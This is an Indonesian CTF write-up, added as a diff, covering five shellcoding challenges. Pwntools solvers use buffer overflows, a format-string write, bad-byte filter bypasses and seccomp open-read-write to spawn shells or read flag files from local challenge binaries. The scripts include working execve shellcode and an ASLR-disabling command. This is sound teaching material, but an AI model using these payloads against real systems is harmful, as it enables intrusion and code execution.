@@ -1,0 +1,515 @@
+<nav class="wu-toc" aria-label="Daftar Isi">
+<p class="wu-toc-title">Daftar Isi</p>
+<ul class="wu-toc-list"><li class="wu-toc-item"><a class="wu-toc-link" href="#challange-1-hackerclasssysphone">Challange 1 - hackerclass/sysphone</a><ul class="wu-toc-list"><li class="wu-toc-item"><a class="wu-toc-link" href="#deskripsi">Deskripsi</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#tl-dr">TL; DR</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#langkah-exploit">Langkah Exploit</a></li></ul></li><li class="wu-toc-item"><a class="wu-toc-link" href="#challange-2-htbchallengeexecute">Challange 2 - htbchallenge/execute</a><ul class="wu-toc-list"><li class="wu-toc-item"><a class="wu-toc-link" href="#deskripsi-2">Deskripsi</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#tl-dr-2">TL; DR</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#langkah-exploit-2">Langkah Exploit</a></li></ul></li><li class="wu-toc-item"><a class="wu-toc-link" href="#challange-3-lksjatimbackdooranonymous">Challange 3 - lksjatim/backdoor_anonymous</a><ul class="wu-toc-list"><li class="wu-toc-item"><a class="wu-toc-link" href="#deskripsi-3">Deskripsi</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#tl-dr-3">TL; DR</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#langkah-exploit-3">Langkah Exploit</a></li></ul></li><li class="wu-toc-item"><a class="wu-toc-link" href="#challange-4-lksn2024brainrot">Challange 4 - lksn2024/brainrot</a><ul class="wu-toc-list"><li class="wu-toc-item"><a class="wu-toc-link" href="#deskripsi-4">Deskripsi</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#tl-dr-4">TL; DR</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#langkah-exploit-4">Langkah Exploit</a></li></ul></li><li class="wu-toc-item"><a class="wu-toc-link" href="#challange-5-pwnabletwstart">Challange 5 - pwnable_tw/start</a><ul class="wu-toc-list"><li class="wu-toc-item"><a class="wu-toc-link" href="#deskripsi-5">Deskripsi</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#tl-dr-5">TL; DR</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#langkah-exploit-5">Langkah Exploit</a></li></ul></li></ul>
+</nav>
+<article class="wu-article">
+<p>Attachment -&gt; <img loading="lazy" decoding="async" src="https://img.shields.io/github/downloads/atom/atom/total.svg" alt="downloads"></p>
+<h2 id="challange-1-hackerclasssysphone">Challange 1 - hackerclass/sysphone</h2>
+<h3 id="deskripsi">Deskripsi</h3>
+<p>Shellcode</p>
+<h3 id="tl-dr">TL; DR</h3>
+<p>Challange ini adalah <strong>Shellcoding</strong> biasa. Jika dilihat dari decompile File, terdapat instruction <strong>__isoc99_scanf</strong> dan <strong>fget()</strong> yang bisa di manfaatkan untuk Buffer Overflow agar bisa RET ke stack <strong>local_108</strong> yang akan kita isi dengan payload <strong>spawn shellcode</strong>. Kalau di check di bagian <strong>init</strong>, terdapat hint <strong>return extraout_EAX;</strong>. Karena di <strong>ROP</strong> ada gadget yang bisa melakukan <strong>JMP RAX</strong>. Kita hanya perlu melakukan <strong>Buffer Overflow</strong> -&gt; Panggil gadget <strong>JMP RAX</strong> -&gt; execute <strong>shellcode</strong>. Permasalahannya, <strong>fgets()</strong> yang dipakai pada binary ini telah di custome dan memiliki <strong>restriction</strong> untuk menulis langsung <strong>asm syscall</strong>. Kita harus melakukan beberapa teknik bypass pada <strong>shellcode</strong> yang dibuat. Dengan menggunakan asm <strong>inc</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/Bkmsvy4WGe.png" alt="image"></p>
+<p>Ya, jadi intinya disini kita melakukan modifikasi pada shellcode yang biasa agar bisa memanggil <strong>syscall()</strong> untuk <strong>spawn shell</strong>.</p>
+<h3 id="langkah-exploit">Langkah Exploit</h3>
+<p>Pertama, lakukan ritual dulu. Dengan command checksec, 
+<img loading="lazy" decoding="async" src="/writeups/shellcoding/ByERXyVbGe.png" alt="image"></p>
+<p>Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/rktu41V-Me.png" alt="image">
+<img loading="lazy" decoding="async" src="/writeups/shellcoding/rJMF4k4-fx.png" alt="image"></p>
+<p>Nah, bisa dilihat instruction <strong>local_10c</strong> berfungsi sebagai buffer / max char dari <strong>fgets()</strong>. Jadi dimasukkan 1000 ke <strong>local_10c</strong>. Maka <strong>fgets()</strong> akan menerima input sampai 1000 - 1. Karena newline di akhir.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/SJs8_k4-zx.png" alt="image"></p>
+<p>Lalu di bagian init terdapat <strong>return extraout_EAX;</strong>. Artinya tidak perlu melakukan leak stack, karena sudah ada ROP yang melompat ke stack terakhir.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/Hy93dy4-fl.png" alt="image"></p>
+<p>Karena RAX menyimpan address dari stack di instruction <strong>LEA RAX -&gt; lcoal_108...</strong>. Maka valid jika dikatakan RAX akan <strong>jump</strong> ke alamat <strong>stack terakhir</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/ByVXY1NWfg.png" alt="image"></p>
+<p>Nah, ini yang agak ngeselin nih. AKu butuh waktu sekitar 30 menit untuk sadar kalo <strong>fgets()</strong> pada chall di custom. Dan melakukan <strong>restriction</strong> terhadap hex <strong>&#39;\x0f&#39;</strong> dan <strong>&#39;\x05&#39;</strong>. Yang dimana jika di print ke char,</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/HkP95yVZGg.png" alt="image"></p>
+<p>Adalah instruction untuk <strong>syscall()</strong>. </p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/BJ8JoJE-ze.png" alt="image"></p>
+<p>Jadi disini saya sedikit mengubah shellcode nya agar tidak langsung memanggil <strong>syscall</strong>, tapi menggunakan inc untuk <strong>menyembunyikan</strong> instruction <strong>syscall()</strong>.</p>
+<p>Jadi Alur Exploitnya adalah:
+<strong>Buffer Overflow</strong> -&gt; <strong>JMP RAX</strong> -&gt; <strong>shellcode</strong> -&gt; <strong>spawn shell</strong> -&gt; cat <strong>flag.txt</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/BkuwoJ4-Ml.png" alt="image">
+<img loading="lazy" decoding="async" src="/writeups/shellcoding/Byl_jk4ZMg.png" alt="image"></p>
+<p>SOLVER:</p>
+<pre><code>from pwn import *
+
+context.log_level = &#39;debug&#39; #debug / info / warning / error / critical / notset
+
+chall = &#39;./chall&#39;
+p = process(chall)
+elf = context.binary = ELF(chall, checksec=False)
+
+# gdb.attach(p, gdbscript=&#39;&#39;&#39;
+# &#39;&#39;&#39;)
+
+shellcode = asm(&#39;&#39;&#39;
+xor rdx, rdx                    
+mov rbx, 0x68732f6e69622f2f     
+shr rbx, 0x8                    
+push rbx                        
+mov rdi, rsp                    
+
+xor rax, rax                    
+push rax                         
+push rdi                         
+mov rsi, rsp                     
+
+mov al, 59
+lea r10, [rip + bypass]
+inc byte ptr [r10]
+
+bypass:
+.byte 0x0e, 0x05                  
+&#39;&#39;&#39;)
+
+print(shellcode)
+payload = shellcode
+payload += b&#39;\x90&#39; * (264 - len(shellcode))
+payload += p64(0x000000000040116c)
+payload = payload + b&#39;A&#39; * (1000 - len(payload))
+
+p.sendline(str(len(payload)).encode())
+sleep(3)
+p.send(payload)
+p.interactive()
+
+# Exploit:
+# /bin/sh\x00 tapi hex nya -&gt;   0x68732f6e69622f
+# //sin/sh tapi hex nya -&gt;      0x68732f6e69622f2f
+# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+</code></pre>
+<h2 id="challange-2-htbchallengeexecute">Challange 2 - htbchallenge/execute</h2>
+<h3 id="deskripsi-2">Deskripsi</h3>
+<p>Shellcode</p>
+<h3 id="tl-dr-2">TL; DR</h3>
+<p>Challange ini adalah <strong>Shellcoding</strong> biasa. Jika dilihat dari hasil decompile. Input akan dimasukkan ke <strong>local_58</strong> dan tidak terdapat Buffer Overflow. Hanya saja di bagian bawah terdapat <strong>((code )local_58)();</strong> yang artinya input akan di execute sebagai bagian dari instruction <strong>Binary File</strong>. Tapi sebelumnya terdapat function <strong>check()</strong> yang akan melakukan checking untuk setiap char dengan sebuah <strong>restriction</strong> yang sudah di set.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/ryFhJgEWGl.png" alt="image"></p>
+<p>Ya, jadi intinya disini kita harus melakukan <strong>modifikasi</strong> input <strong>shellcode</strong> agar tidak terkena <strong>restriction</strong> sama sekali. Jika berhasil, maka program akan langsung <strong>spawn shell</strong>. </p>
+<h3 id="langkah-exploit-2">Langkah Exploit</h3>
+<p>Pertama, lakukan ritual dulu. Dengan command checksec, </p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/BJTaJx4bGl.png" alt="image"></p>
+<p>Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/SkCCyeVZGl.png" alt="image"></p>
+<p>Disini bisa langsung dilihat kalau input akan di execute sebagai insturction juga di bagian paling bawah. Jadi bisa langsung input shellcode nya kedalam <strong>local_58</strong>. Tapi permasalahannya terdapat function check yang jika dilihat.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/SkGHxxEZMe.png" alt="image"></p>
+<p>Dia akan mengecek input kita satu persatu dengan restriction yang sudah di set pada <strong>local_78</strong>. Tapi disini terdapat <strong>vulnerability</strong> juga, karena <strong>local_78</strong> hanya terdapat <strong>16 restriction</strong>. Dan input <strong>shellcode</strong> bisa lebih dari <strong>16 char</strong>. Maka hanya perlu memperhatikan <strong>16 char pertama</strong> agar tidak terkena <strong>restriction</strong>. karena di char setelahnya akan <strong>nge bug</strong> dan di compare dengan <strong>ketiadaan</strong>.</p>
+<pre><code class="language-a">#!/usr/bin/env python3
+from pwn import *
+import itertools
+
+# Supress error pwntools saat asm gagal compile
+context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;error&#39;)
+
+# ================= CONFIGURE YOUR RESTRICTIONS HERE =================
+# Ubah BAD_BYTES ini sesuai dengan blacklist di soal challenge kamu!
+BAD_BYTES = bytes([
+    ord(&#39;;&#39;),      # [0] 
+    ord(&#39;T&#39;),      # [1]
+    ord(&#39;b&#39;),      # [2]
+    ord(&#39;i&#39;),      # [3]
+    ord(&#39;n&#39;),      # [4]
+    ord(&#39;s&#39;),      # [5] (Ingat fungsi perbandingannya punya bug, 
+    ord(&#39;h&#39;),      # [6]  mungkin &#39;s&#39; ga bakal di cek, tapi gpp masukkan saja)
+    -10 &amp; 0xff,    # [7]  Angka desimal negatif (-10)
+    -0x2e &amp; 0xff,  # [8]  Angka hex negatif (-0x2e)
+    -0x40 &amp; 0xff,  # [9]
+    ord(&#39;_&#39;),      # [10]
+    -0x37 &amp; 0xff,  # [11]
+    ord(&#39;f&#39;),      # [12]
+    ord(&#39;l&#39;),      # [13]
+    ord(&#39;a&#39;),      # [14]
+    ord(&#39;g&#39;),      # [15]
+    0              # [16] (Null byte 0x00)
+])
+
+print(&quot;Blacklist hex: &quot;, BAD_BYTES.hex())
+# Outputnya otomatis jadi: 3b5462696e7368f6d2c05fc9666c616700
+
+# Penjelasan:
+# 1. ord(&#39;x&#39;) mengubah karakter menjadi nilai integer desimalnya (contoh: ord(&#39;A&#39;) = 65).
+# 2. &amp; 0xff berguna untuk mengambil 8-bit terakhir saja (1 byte). Kalau kamu punya -10, di Python jika di-bitmask &amp; 0xff, dia akan dikonversi menjadi 246 (atau 0xf6), persis sama perilakunya dengan kompilator C.
+# 3. bytes([...]) akan mengubah list integer tersebut menjadi sekumpulan byte asli (byte object di Python).
+
+# ====================================================================
+
+r64 = [&#39;rax&#39;, &#39;rbx&#39;, &#39;rcx&#39;, &#39;rdx&#39;, &#39;rsi&#39;, &#39;rdi&#39;, &#39;rbp&#39;, &#39;rsp&#39;, &#39;r8&#39;, &#39;r9&#39;, &#39;r10&#39;, &#39;r11&#39;, &#39;r12&#39;, &#39;r13&#39;, &#39;r14&#39;, &#39;r15&#39;]
+r32 = [&#39;eax&#39;, &#39;ebx&#39;, &#39;ecx&#39;, &#39;edx&#39;, &#39;esi&#39;, &#39;edi&#39;, &#39;ebp&#39;, &#39;esp&#39;, &#39;r8d&#39;, &#39;r9d&#39;, &#39;r10d&#39;, &#39;r11d&#39;, &#39;r12d&#39;, &#39;r13d&#39;, &#39;r14d&#39;, &#39;r15d&#39;]
+r16 = [&#39;ax&#39;, &#39;bx&#39;, &#39;cx&#39;, &#39;dx&#39;, &#39;si&#39;, &#39;di&#39;, &#39;bp&#39;, &#39;sp&#39;, &#39;r8w&#39;, &#39;r9w&#39;, &#39;r10w&#39;, &#39;r11w&#39;, &#39;r12w&#39;, &#39;r13w&#39;, &#39;r14w&#39;, &#39;r15w&#39;]
+r8  = [&#39;al&#39;, &#39;bl&#39;, &#39;cl&#39;, &#39;dl&#39;, &#39;sil&#39;, &#39;dil&#39;, &#39;bpl&#39;, &#39;spl&#39;, &#39;r8b&#39;, &#39;r9b&#39;, &#39;r10b&#39;, &#39;r11b&#39;, &#39;r12b&#39;, &#39;r13b&#39;, &#39;r14b&#39;, &#39;r15b&#39;]
+
+def is_safe(bc):
+    return not any(b in BAD_BYTES for b in bc)
+
+def test_inst(inst):
+    try:
+        bc = asm(inst)
+        if is_safe(bc): return bc
+    except:
+        pass
+    return None
+
+def fuzz_category(title, combinations):
+    print(f&quot;\n[+] === {title} ===&quot;)
+    found = 0
+    for inst in combinations:
+        bc = test_inst(inst)
+        if bc:
+            print(f&quot;  {inst:&lt;25} -&gt; {bc.hex()}&quot;)
+            found += 1
+    if found == 0:
+        print(&quot;  [-] No safe instruction found for this category.&quot;)
+
+def fuzz_zeroing():
+    insts = []
+    for reg in r64 + r32:
+        insts.extend([f&quot;xor {reg}, {reg}&quot;, f&quot;sub {reg}, {reg}&quot;])
+    fuzz_category(&quot;ZEROING REGISTERS&quot;, insts)
+
+def fuzz_pushes_pops():
+    push_insts = [f&quot;push {reg}&quot; for reg in r64]
+    pop_insts  = [f&quot;pop {reg}&quot; for reg in r64]
+    fuzz_category(&quot;PUSH REGISTERS&quot;, push_insts)
+    fuzz_category(&quot;POP REGISTERS&quot;, pop_insts)
+
+def fuzz_inc_dec():
+    insts = []
+    for reg in r64 + r32 + r8:
+        insts.extend([f&quot;inc {reg}&quot;, f&quot;dec {reg}&quot;])
+    fuzz_category(&quot;INCREMENT / DECREMENT&quot;, insts)
+
+def fuzz_syscall_alternatives():
+    fuzz_category(&quot;SYSCALLS&quot;, [&quot;syscall&quot;, &quot;int 0x80&quot;, &quot;sysenter&quot;])
+
+def fuzz_custom_mov(dst, src):
+    insts = [
+        f&quot;mov {dst}, {src}&quot;,
+        f&quot;push {src}; pop {dst}&quot;,
+        f&quot;xchg {dst}, {src}&quot;
+    ]
+    fuzz_category(f&quot;MOVING {src} TO {dst}&quot;, insts)
+
+def fuzz_custom_set_imm(reg, val):
+    insts = [
+        f&quot;mov {reg}, {val}&quot;,
+        f&quot;push {val}; pop {reg}&quot;
+    ]
+    if val == 0:
+        insts.extend([f&quot;xor {reg}, {reg}&quot;, f&quot;sub {reg}, {reg}&quot;])
+    elif val == 59:
+        insts.extend([
+            f&quot;mov {reg}, 60; dec {reg}&quot;,
+            f&quot;push 60; pop {reg}; dec {reg}&quot;,
+            f&quot;push 58; pop {reg}; inc {reg}&quot;
+        ])
+    fuzz_category(f&quot;SET {reg} to {val}&quot;, insts)
+
+if __name__ == &#39;__main__&#39;:
+    print(f&quot;[*] Starting Fuzzer...&quot;)
+    print(f&quot;[*] Bad Bytes: {BAD_BYTES.hex()}&quot;)
+    fuzz_zeroing()
+    fuzz_pushes_pops()
+    fuzz_inc_dec()
+    fuzz_syscall_alternatives()
+    print(&quot;\n\n[!] === CUSTOM TARGETS ===&quot;)
+    fuzz_custom_mov(&quot;rdi&quot;, &quot;rsp&quot;)
+    fuzz_custom_mov(&quot;rax&quot;, &quot;rbx&quot;)
+    fuzz_custom_set_imm(&quot;al&quot;, 59)
+    fuzz_custom_set_imm(&quot;rax&quot;, 0)
+</code></pre>
+<p>Jadi disini saya sudah membuat fuzzing untuk seleksi instruction mana saja yang bisa digunakan dan aman dari restrictionnya. <strong>(pake gemini)</strong></p>
+<p>Jadi inti exploitnya hanya merakit shellcode, agar tidak terkenal restriction.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/H1x8EMg4Zzx.png" alt="image"></p>
+<p>SOLVER:</p>
+<pre><code>from pwn import *
+
+context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+
+chall = &#39;./execute&#39;
+p = process(chall)
+
+original_string = 0x68732f6e69622f2f
+xor_key         = 0x2222222222222222
+encoded_string  = original_string ^ xor_key  
+
+shellcode_asm = f&quot;&quot;&quot;
+    xor ebx, ebx
+    mov edx, ebx
+    mov esi, ebx
+    push rbx
+    movabs rbx, {hex(encoded_string)}
+    movabs rbp, {hex(xor_key)}
+    xor rbx, rbp
+    push rbx
+    mov rdi, rsp
+    push 60
+    pop rax
+    dec eax
+    syscall
+&quot;&quot;&quot;
+cleaned_shellcode = asm(shellcode_asm)
+print(&#39;ASM: &#39;,cleaned_shellcode)
+print(&#39;LEN: &#39;,len(cleaned_shellcode))
+print(&#39;DISASS: &#39;,disasm(cleaned_shellcode))
+
+p.sendline(cleaned_shellcode)
+p.interactive()
+</code></pre>
+<h2 id="challange-3-lksjatimbackdooranonymous">Challange 3 - lksjatim/backdoor_anonymous</h2>
+<h3 id="deskripsi-3">Deskripsi</h3>
+<p>Shellcode</p>
+<h3 id="tl-dr-3">TL; DR</h3>
+<p>Challange ini adalah <strong>Shellcoding</strong> yang agak gak biasa. Jika dilihat dari hasil decompile. Pertama, harus melakukan overwrite untuk nilai dari sebuah param. Lalu akan JUMP ke <strong>gets()</strong>. Dari sini jika ingin menggunakan shellcoding. Harus melakukan leak untuk stack yang menyimpan input dari <strong>gets()</strong>. Jadi caranya, pertama lakukan <strong>fmstr_payload</strong> untuk set nilai dari param <strong>hackermode</strong> -&gt; sampai di <strong>gets()</strong> -&gt; <strong>Buffer Overflow</strong> -&gt; <strong>RET</strong> ke main -&gt; <strong>leak address stack</strong> -&gt; Hitung <strong>offset</strong> sampai ke <strong>stack</strong> dari <strong>gets()</strong> -&gt; sampai ke <strong>gets()</strong> -&gt; Input <strong>shellcode</strong> -&gt; <strong>RET</strong> ke stack dari <strong>gets()</strong> -&gt; <strong>spawn shell</strong> -&gt; <strong>cat flag.txt</strong>. </p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/HJAf_l4bMg.png" alt="image"></p>
+<p>Ya, jadi intinya disini kita memanfaatkan vulnerability <strong>printf</strong> untuk mengubah nilai <strong>hackermode</strong> dan leak <strong>stack address</strong>. Dan panjang byte dari <strong>shellcode</strong> juga harus kurang dari <strong>32 byte</strong>. Karena buffer dari <strong>local_28</strong> which is tempat menyimpan input dari <strong>gets()</strong> hanya <strong>32 char</strong>.</p>
+<h3 id="langkah-exploit-3">Langkah Exploit</h3>
+<p>Pertama, lakukan ritual dulu. Dengan command checksec, </p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/rkxTOxVbMe.png" alt="image"></p>
+<p>Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/rkYR_gNWfx.png" alt="image"></p>
+<p>Disini terlihat vulnerability printf. Yang bisa dimanfaatkan untuk leak address. Tapi karena tidak ada function win, kita telusuri lebih jauh dulu ke dalam function <strong>analyze()</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/HJczKg4bGx.png" alt="image"></p>
+<p>Nah, terdapat if else disini. kalau ingin sampai ke <strong>gets()</strong>. Harus membuat param <strong>hackermode</strong> memiliki nilai <strong>0x19 atau 25</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/HyKs9lN-zg.png" alt="image"></p>
+<p>Kalau di check dari gdb, ternyata address dari hackermode ada di <strong>0x40403c</strong>. Jadi jika kita set <strong>0x40403c</strong> menjadi 25. Seharusnya akan masuk kedalam <strong>gets()</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/H15Msx4Zzl.png" alt="image"></p>
+<p>Terbukti, setelah di set menjadi 25. instruction <strong>JE</strong> langsung berubah centang.</p>
+<p>Jadi Exploit nya adalah:
+<strong>fmstr_payload</strong> -&gt; masuk ke <strong>gets()</strong> -&gt; <strong>Buffer Overflow</strong> -&gt; <strong>RET</strong> ke main -&gt; leak <strong>stack address</strong> -&gt; masuk ke <strong>gets()</strong> lagi -&gt; send <strong>shellcode</strong> + <strong>Buffer Overflow</strong> -&gt; <strong>RET</strong> ke stack yang berisi <strong>shellcode</strong> -&gt; <strong>Spawn shell</strong> -&gt; <strong>cat flag.txt</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/S1yqagNZMg.png" alt="image"></p>
+<p>SOLVER:</p>
+<pre><code>from pwn import *
+
+# context.log_level = &#39;debug&#39; #debug / info / warning / error / critical / notset
+
+chall = &#39;./backdoor&#39;
+p = process(chall)
+elf = context.binary = ELF(chall, checksec=False)
+
+gdb.attach(p, gdbscript=&#39;&#39;&#39;
+break *0x000000000040119c
+&#39;&#39;&#39;)
+
+payload = fmtstr_payload(8, {0x40403c: 25}, write_size=&#39;int&#39;)
+p.sendline(payload)
+
+sleep(3)
+payload = b&#39;A&#39;* 40
+payload += p64(0x000000000040119d)
+p.sendline(payload)
+p.recv()
+sleep(1)
+p.sendline(b&#39;%13$p&#39;)
+p.recv()
+p.recvuntil(b&#39;: &#39;)
+
+hasil = p.recv().decode().strip()
+stack = int(hasil, 16) - 0xb8
+
+print(hex(stack))
+
+# Shellcode: execve(&quot;/bin/sh&quot;, NULL, NULL) - 22 Bytes
+shellcode = b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x6a\x3b\x58\x0f\x05&quot;
+
+print(len(shellcode))
+payload = shellcode + b&#39;A&#39; * (40 - len(shellcode))
+payload += p64(stack)
+p.sendline(payload)
+
+# print(disasm(shellcode))
+
+p.interactive()
+
+
+# Exploit:
+# # /bin/sh\x00 tapi hex nya -&gt;   0x68732f6e69622f
+# //sin/sh tapi hex nya -&gt;      0x68732f6e69622f2f
+# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+</code></pre>
+<h2 id="challange-4-lksn2024brainrot">Challange 4 - lksn2024/brainrot</h2>
+<h3 id="deskripsi-4">Deskripsi</h3>
+<p>Shellcode</p>
+<h3 id="tl-dr-4">TL; DR</h3>
+<p>Challange ini adalah <strong>Shellcoding</strong> yang biasa. Jika dilihat dari hasil decompile, terdapat function <strong>sandbox()</strong> yang berisi dengan <strong>seccomp rule</strong>. Dimana syscall yang diizinkan disini hanya <strong>0</strong>, <strong>1</strong>, dan <strong>2</strong>. Yaitu <strong>Read</strong>, <strong>Write</strong>, dan <strong>Open</strong>. Dan pada function main, Binary memanggil instruction read dengan max input <strong>0x100 byte</strong>. Lalu melakukan execute input read sebagai <strong>Binary Instruction</strong>. Jadi disini harus membuat payload <strong>shellcoding ORW</strong> namanya.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/BJqfPOP-Mg.png" alt="image"></p>
+<p>Ya, jadi intinya disini kita memanfaatkan Open Read Write untuk <strong>membuka file</strong> -&gt; <strong>membaca isi file</strong> -&gt; <strong>menuliskan isi file</strong>.</p>
+<h3 id="langkah-exploit-4">Langkah Exploit</h3>
+<p>Pertama, lakukan ritual dulu. Dengan command checksec, </p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/rJPSrdwZzg.png" alt="image"></p>
+<p>Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/HkRDvuwbGl.png" alt="image"></p>
+<p>Bisa dilihat, pada function <strong>read()</strong>, input kita disimpan ke variable <strong>func</strong>. Lalu dibawahnya persis variable <strong>func</strong> di <strong>execute</strong> sebagai <strong>code</strong> pada <strong>Binary File</strong> itu sendiri.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/SJJRD_DZfg.png" alt="image"></p>
+<p>Tapi sebelum read, program akan melompat ke function <strong>sandbox()</strong>. Dimana disini terdapat <strong>seccomp rule</strong>, yang memberikan <strong>restriction</strong> terhadap penggunaan syscall.
+<strong>seccomp_init(0)</strong> -&gt; Default setting untuk restrict semua syscall.
+<strong>seccom_rule_add</strong> -&gt; Menambahkan syscall yang boleh dipergunakan.
+<strong>seccomp_load</strong> -&gt; Mengaktifkan seccomp rule.</p>
+<p>Jadi pada Binary File ini hanya diizinkan untuk menggunakan syscall 0, 1, dan 2. Dimana itu adalah syscall untuk <strong>Read</strong>, <strong>Write</strong>, dan <strong>Open</strong>.</p>
+<pre><code class="language-a">shellcode = asm(&#39;&#39;&#39;
+                sub rsp, 0x200
+                sub rax, rax
+                push rax
+                mov rbx, 0x000000007478742e
+                push rbx
+                mov rbx, 0x6974736b65697474
+                push rbx
+                mov rbx, 0x6f6467616c662f2e
+                push rbx
+
+                mov rdi, rsp
+                mov rsi, 0x0
+                mov rdx, 0x0
+                mov rax, 0x2
+                syscall
+                mov r8, rax
+
+                mov rdi, r8
+                lea rsi, [rsp - 0x100] 
+                mov rdx, 0x100
+                mov rax, 0x0
+                syscall
+                
+                mov rdi, 0x1
+                lea rsi, [rsp - 0x100]
+                mov rdx, rax
+                mov rax, 0x1
+                syscall
+
+                mov rax, 0x3c
+                syscall
+&#39;&#39;&#39;)
+</code></pre>
+<p>Jadi ini <strong>shellcoding</strong> yang ku buat. Dengan alur:
+Menulis string <strong>flagdottieksti.txt</strong> ke rsp -&gt; memanggil <strong>syscall open</strong> -&gt; memindahkan fd hasil open ke <strong>r8</strong> -&gt; memanggil <strong>syscall read</strong> -&gt; memanggil <strong>syscall write</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/ryQY9_P-zl.png" alt="image">
+<img loading="lazy" decoding="async" src="/writeups/shellcoding/HJFKqdPWfx.png" alt="image"></p>
+<p>SOLVER:</p>
+<pre><code>from pwn import *
+
+context.log_level = &#39;debug&#39; #debug / info / warning / error / critical / notset
+
+chall = &#39;./chall&#39;
+p = process(chall)
+elf = context.binary = ELF(chall, checksec=False)
+
+gdb.attach(p, gdbscript=&#39;&#39;&#39;
+&#39;&#39;&#39;)
+
+# ./flagdo -&gt; 0x6f6467616c662f2e
+# ttieksti -&gt; 0x6974736b65697474
+# .txt\x00\x00\x00\x00 -&gt; 0x000000007478742e
+
+shellcode = asm(&#39;&#39;&#39;
+                sub rsp, 0x200
+                sub rax, rax
+                push rax
+                mov rbx, 0x000000007478742e
+                push rbx
+                mov rbx, 0x6974736b65697474
+                push rbx
+                mov rbx, 0x6f6467616c662f2e
+                push rbx
+
+                mov rdi, rsp
+                mov rsi, 0x0
+                mov rdx, 0x0
+                mov rax, 0x2
+                syscall
+                mov r8, rax
+
+                mov rdi, r8
+                lea rsi, [rsp - 0x100] 
+                mov rdx, 0x100
+                mov rax, 0x0
+                syscall
+                
+                mov rdi, 0x1
+                lea rsi, [rsp - 0x100]
+                mov rdx, rax
+                mov rax, 0x1
+                syscall
+
+                mov rax, 0x3c
+                syscall
+&#39;&#39;&#39;)
+
+p.sendline(shellcode)
+
+p.interactive()
+
+shellcraft()
+
+# Exploit:
+# Strategi awal = Mbuat asm ORW -&gt; Open -&gt; Read -&gt; Write. 
+
+# # /bin/sh\x00 tapi hex nya -&gt;   0x68732f6e69622f
+# //sin/sh tapi hex nya -&gt;      0x68732f6e69622f2f
+# code ubah strings 8 byte menjadi hex. Agar bisa dimasukkan ke ASM: 
+# python -c &quot;from pwn import * ; print(hex(u64(b&#39;./flagdo&#39;)))&quot;
+
+# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+</code></pre>
+<h2 id="challange-5-pwnabletwstart">Challange 5 - pwnable_tw/start</h2>
+<h3 id="deskripsi-5">Deskripsi</h3>
+<p>Shellcode</p>
+<h3 id="tl-dr-5">TL; DR</h3>
+<p>Challange ini adalah <strong>Shellcoding</strong> yang biasa. Dari hasil decompile terdapat vulnerability Buffer Overflow yang bisa kita gunakan untuk leak <strong>address stack</strong>. Lalu setelah leak stack, baru bisa memasukkan shellcode ke bagian <strong>read()</strong> karena instruction ini menerima input sampai <strong>60 char</strong>. Tapi masalahnya <strong>capacity stack</strong> sampai ke <strong>RET</strong> hanya <strong>20 byte</strong>. Sedangkan shellcode yang kubuat <strong>24 byte</strong>. Sehingga payload yang memungkinkan adalah:
+send <strong>20 byte</strong> sampah -&gt; <strong>RET</strong> ke <strong>syscall write</strong> -&gt; <strong>leak stack</strong> -&gt; masuk ke <strong>instruction read()</strong> lagi -&gt; input read dengan <strong>20 byte</strong> sampah + <strong>Address stack</strong> + <strong>shellcode</strong> -&gt; <strong>RET</strong> ke stack -&gt; <strong>execute shellcode</strong>.
+<img loading="lazy" decoding="async" src="/writeups/shellcoding/ryLDkFDWfx.png" alt="image"></p>
+<p>Ya, jadi intinya disini kita memanfaatkan <strong>read()</strong>.</p>
